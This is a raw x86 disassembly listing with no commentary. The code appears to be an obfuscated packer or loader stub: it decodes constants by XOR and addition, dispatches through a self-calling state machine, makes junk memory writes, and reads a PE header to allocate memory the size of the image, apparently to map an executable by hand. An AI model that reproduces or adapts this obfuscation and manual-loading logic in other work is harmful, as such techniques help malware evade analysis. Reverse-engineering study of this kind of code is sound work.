  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
